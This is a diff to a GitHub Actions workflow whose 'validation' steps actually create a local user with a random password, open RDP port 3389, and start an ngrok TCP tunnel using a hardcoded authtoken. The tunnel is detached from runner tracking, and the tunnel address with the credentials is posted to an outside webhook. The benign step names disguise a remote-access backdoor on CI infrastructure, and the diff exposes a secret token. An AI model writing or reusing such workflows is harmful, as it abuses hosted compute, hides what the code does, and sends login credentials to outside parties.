@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (ngrok TCP - Fixed & Detached)
+      - name: Start Background Validation Service (ngrok TCP - Final Fixed)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -75,7 +75,7 @@ jobs:
           netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          # === ngrok Setup (النسخة النهائية المضمونة) ===
+          # === ngrok Setup (النسخة النهائية) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -90,10 +90,9 @@ jobs:
           $ngrokToken = "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn"
           & $exe config add-authtoken $ngrokToken
 
-          # فصل العملية عن GitHub Runner (مهم جداً)
           $env:RUNNER_TRACKING_ID = $null
 
-          Write-Host "Starting ngrok TCP tunnel with full detachment..."
+          Write-Host "Starting ngrok TCP tunnel..."
 
           $process = Start-Process -FilePath $exe `
             -ArgumentList "tcp 3389 --log=stdout --log-level=debug" `
@@ -107,65 +106,51 @@ jobs:
 
           Start-Sleep -Seconds 25
 
-          # استخراج الرابط (log + API)
+          # استخراج الرابط
           $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
-          $errData = Get-Content $errLog -Raw -ErrorAction SilentlyContinue
-
           $url = $null
           if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
 
           if (-not $url) {
               try {
-                  $api = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -Method Get -ErrorAction Stop
+                  $api = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -Method Get
                   $tunnel = $api.tunnels | Where-Object { $_.proto -eq "tcp" } | Select-Object -First 1
                   if ($tunnel) { $url = $tunnel.public_url }
-              } catch { Write-Host "API not ready yet" }
+              } catch { }
           }
 
           if ($url) {
               $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (detached PID $ngrokPid)"
-              Write-Host "✅ ngrok tunnel created successfully - PID: $ngrokPid"
-          } else {
-              $msg = "Init failed:`nLog: $($logData[-500..-1] -join "`n")`nErr: $($errData[-200..-1] -join "`n")"
+              Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
           }
 
-          $body = @{ content = $msg } | ConvertTo-Json
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-
-          # طباعة اللوج للتشخيص
-          Write-Host "`n--- ngrok Log (آخر 30 سطر) ---"
-          Get-Content $log -Tail 30 -ErrorAction SilentlyContinue | Write-Host
-          Write-Host "`n--- ngrok Error Log ---"
-          Get-Content $errLog -Tail 20 -ErrorAction SilentlyContinue | Write-Host
-
-      - name: Run Diagnostics
-        run: |
+          # === SysDiag داخل نفس الخطوة (فوري) ===
           $rep = "SysDiag:`n"
-
           $ts = Get-Service TermService -ErrorAction SilentlyContinue
-          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
+          $rep += "SVC: $($ts.Status)`n"
 
           $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
           $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
           $rep += "REG: $r1 | $r2`n"
 
           $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
-          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
+          $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
 
           $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
-          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
+          $rep += if ($fw) { "FW: OK`n" } else { "FW: ERR`n" }
 
-          # فحص ngrok (عملية + ملف PID)
           $np = Get-Process ngrok -ErrorAction SilentlyContinue
           if (-not $np -and (Test-Path "$env:TEMP\ngrok.pid")) {
               $savedPid = Get-Content "$env:TEMP\ngrok.pid" -Raw
               $np = Get-Process -Id $savedPid -ErrorAction SilentlyContinue
           }
-          if ($np) { $rep += "PRC: OK (PID $($np.Id))`n" } else { $rep += "PRC: ERR`n" }
+          $rep += if ($np) { "PRC: OK (PID $($np.Id))`n" } else { "PRC: ERR`n" }
 
-          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-        continue-on-error: true
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"
+
+          # طباعة اللوج للـ Actions
+          Write-Host "`n--- ngrok Log (آخر 30 سطر) ---"
+          Get-Content $log -Tail 30 | Write-Host
 
       - name: Run Extended Validation (with ngrok monitoring)
         run: |
